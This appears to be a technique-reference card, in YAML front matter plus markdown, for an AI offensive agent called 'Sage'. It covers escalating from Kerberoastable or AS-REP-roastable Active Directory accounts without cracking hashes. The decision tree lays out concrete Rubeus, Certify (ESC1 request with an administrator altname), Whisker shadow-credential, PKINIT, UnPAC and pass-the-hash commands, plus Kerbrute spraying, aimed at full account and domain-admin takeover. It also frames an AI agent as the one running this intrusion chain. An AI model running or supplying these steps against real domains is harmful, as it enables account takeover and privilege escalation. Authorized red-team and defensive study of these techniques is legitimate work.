---
name: Kerberoast / AS-REP Roast Without Cracking (ADCS Path)
category: adcs
subcategories: [kerberoast-to-cert, asrep-to-cert, no-crack-privesc, account-targeting]
tradecraft_tags: [kerberoast, asrep, no-crack, adcs, certify, whisker, shadow-credentials, technique]
mitre_attack:
  - id: T1649
    name: Steal or Forge Authentication Certificates
source:
  url: https://attack.mitre.org/
  license: none
  maintained: false
binary_type: none
binary_filename: ""
supported_os: [windows]
architecture: [x64]
privilege_required: domain-user
network_required: true
detection_signal: |
  Same as the individual techniques used: LDAP enumeration, certificate enrollment,
  S4U chain, shadow credential write. No additional detection beyond the component techniques.
usage_examples:
  - description: Find kerberoastable accounts → check for ADCS ESC1 enrollment rights
    args: "Rubeus.exe kerberoast /ldaponly → Certify.exe find /vulnerable"
  - description: If account has GenericWrite → shadow credentials + PKINIT path
    args: "Whisker.exe add /target:<kerberoastable-svc-acct> → Rubeus.exe asktgt /certificate:..."
  - description: If ADCS ESC1 exists and account can enroll → request cert + authenticate
    args: "Certify.exe request /ca:CA /template:VulnTemplate /altname:admin@domain"
opsec_notes: |
  Kerberoasting and AS-REP roasting are traditionally followed by offline hash cracking.
  Sage does NOT crack hashes. However, both techniques identify service accounts that are
  often high-value targets for non-crack exploitation paths. This document maps the
  "found kerberoastable account" discovery to ADCS/delegation paths that don't require cracking.
gotchas: |
  This is a TECHNIQUE REFERENCE — a decision tree for when Sage identifies kerberoastable
  or AS-REP-roastable accounts. The goal is to exploit the ACCOUNT via alternative paths
  rather than cracking the hash. Key insight: a kerberoastable service account is simply
  an account with an SPN — it may also have GenericWrite ACLs, may be eligible for
  certificate enrollment, or may have delegation configured.
related_ttps: [rubeus-kerberoast-nocrack, asrep-roast-inventory, certify, whisker,
               constrained-delegation-abuse, acl-abuse-chain]
alternatives: []
common_args: {}
last_updated: 2026-05-29
---

# Kerberoast / AS-REP Roast Without Cracking (ADCS Path)

A decision reference for exploiting kerberoastable and AS-REP-roastable accounts
without offline hash cracking. Sage's operational constraint is that it cannot crack
hashes — but discovering these accounts still opens alternative exploitation paths.

## The Core Insight

Kerberoastable/AS-REP-roastable accounts are just **service accounts with specific
properties**. Their value to Sage is not the hash — it's the account itself, which may
be exploitable through ADCS, delegation, or ACL abuse paths.

## Decision Tree: What to Do With a Discovered Kerberoastable Account

```
Found kerberoastable account: svc-backup$

Step 1: Check ACLs on the account
  → Get-DomainObjectAcl -Identity svc-backup -ResolveGUIDs
  → BloodHound: is there a GenericWrite/GenericAll path TO this account?

  If GenericWrite on svc-backup exists:
    → Whisker shadow credentials → PKINIT TGT → UnPAC hash → PTH
    → No cracking needed; full account takeover

Step 2: Check ADCS enrollment rights
  → Certify find /vulnerable
  → Does svc-backup (or a group it belongs to) have enrollment rights on an ESC1 template?

  If ESC1 enrollment available and svc-backup has access:
    → Certify request /ca:CA /template:ESC1Template /altname:administrator
    → Rubeus PKINIT with the cert → UnPAC hash → PTH
    → No cracking needed

Step 3: Check delegation configuration
  → Get-DomainUser svc-backup -Properties msDS-AllowedToDelegateTo
  → Is constrained delegation configured? Protocol transition?

  If constrained delegation with protocol transition:
    → Need the account's credentials (not available without crack)
    → But: can we get credentials via shadow credentials or ADCS instead?

Step 4: Check what the account has access to
  → BloodHound: what can svc-backup do?
  → Is it in groups with high privilege?
  → Does it have direct ACLs on sensitive objects?
  → Report to operator for targeted exploitation

Step 5: No alternate path found
  → Report as potential target for external cracking (operator task)
  → Note: if account password is weak, it may be sprayed via Kerbrute
```

## AS-REP Roastable Account Decision

Same tree as above. AS-REP-roastable accounts have `DONT_REQ_PREAUTH` set — unusual
for service accounts but sometimes seen on:
- Legacy application service accounts
- Accounts that were misconfigured for a specific application
- Sometimes set on accounts to enable non-Windows Kerberos auth

## Why This Matters for Sage

Sage's workflow explicitly avoids offline cracking. Reporting kerberoastable accounts
to the operator without an alternate path wastes an opportunity. This decision tree
ensures Sage explores non-crack paths before declaring an account unactionable.
